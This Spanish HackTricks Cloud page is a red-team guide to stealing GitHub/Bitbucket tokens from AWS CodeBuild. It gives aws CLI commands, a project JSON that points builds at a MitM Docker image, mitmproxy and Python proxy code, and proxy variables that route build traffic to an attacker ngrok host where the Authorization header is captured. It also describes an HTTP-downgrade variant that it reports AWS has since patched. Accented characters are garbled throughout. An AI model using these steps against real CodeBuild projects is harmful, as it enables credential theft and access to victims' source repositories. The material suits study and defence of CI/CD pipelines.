# AWS Codebuild - Fuga de Tokens

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de Github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Recuperar Tokens Configurados de Github/Bitbucket

Primero, verifica si hay credenciales de origen configuradas que podr칤as filtrar:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Si descubre que la autenticaci칩n para, por ejemplo, Github est치 configurada en la cuenta, puede **exfiltrar** ese **acceso** (**token de GH o token de OAuth**) haciendo que Codebuild **utilice una imagen de Docker espec칤fica** para ejecutar la construcci칩n del proyecto.

Para este prop칩sito, podr칤a **crear un nuevo proyecto de Codebuild** o cambiar el **entorno** de uno existente para configurar la **imagen de Docker**.

La imagen de Docker que podr칤a usar es [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta es una imagen de Docker muy b치sica que configurar치 las **variables de entorno `https_proxy`**, **`http_proxy`** y **`SSL_CERT_FILE`**. Esto le permitir치 interceptar la mayor칤a del tr치fico del host indicado en **`https_proxy`** y **`http_proxy`** y confiar en el CERT SSL indicado en **`SSL_CERT_FILE`**.

1. **Cree y suba su propia imagen Docker MitM**
* Siga las instrucciones del repositorio para configurar la direcci칩n IP de su proxy y establecer su certificado SSL y **construir la imagen de Docker**.
* **NO CONFIGURE `http_proxy`** para no interceptar solicitudes al punto final de metadatos.
* Podr칤a usar **`ngrok`** como `ngrok tcp 4444` para configurar el proxy a su host.
* Una vez que tenga construida la imagen de Docker, **s칰bala a un repositorio p칰blico** (Dockerhub, ECR...)
2. **Configure el entorno**
* Cree un **nuevo proyecto de Codebuild** o **modifique** el entorno de uno existente.
* Configure el proyecto para usar la **imagen de Docker generada previamente**

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

3. **Configure el proxy MitM en su host**

* Como se indica en el **repositorio de Github**, podr칤a usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
La **versi칩n de mitmproxy utilizada fue la 9.0.1**, se inform칩 que con la versi칩n 10 esto podr칤a no funcionar.
{% endhint %}

4. **Ejecuta la construcci칩n y captura las credenciales**

*   Puedes ver el token en el encabezado **Authorization**:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Esto tambi칠n podr칤a hacerse desde la aws cli con algo como

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~Mediante el protocolo HTTP~~

{% hint style="success" %}
**Esta vulnerabilidad fue corregida por AWS en alg칰n momento de la semana del 20 de febrero de 2023 (creo que el viernes). Por lo tanto, un atacante ya no puede abusar de ella :)**
{% endhint %}

Un atacante con **permisos elevados en un CodeBuild podr칤a filtrar el token de Github/Bitbucket** configurado o si los permisos se configuraron a trav칠s de OAuth, el **token temporal de OAuth utilizado para acceder al c칩digo**.

* Un atacante podr칤a agregar las variables de entorno **http\_proxy** y **https\_proxy** al proyecto CodeBuild apuntando a su m치quina (por ejemplo `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Luego, cambiar la URL del repositorio de github para usar HTTP en lugar de HTTPS, por ejemplo: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* Despu칠s, ejecutar el ejemplo b치sico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto indicado por las variables de proxy (http\_proxy y https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Finalmente, haz clic en **Build the project**, las **credenciales** ser치n **enviadas en texto claro** (base64) al puerto mitm:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Ahora un atacante podr치 usar el token desde su m치quina, listar todos los privilegios que tiene y (ab)usarlos m치s f치cilmente que utilizando el servicio CodeBuild directamente.
{% endhint %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
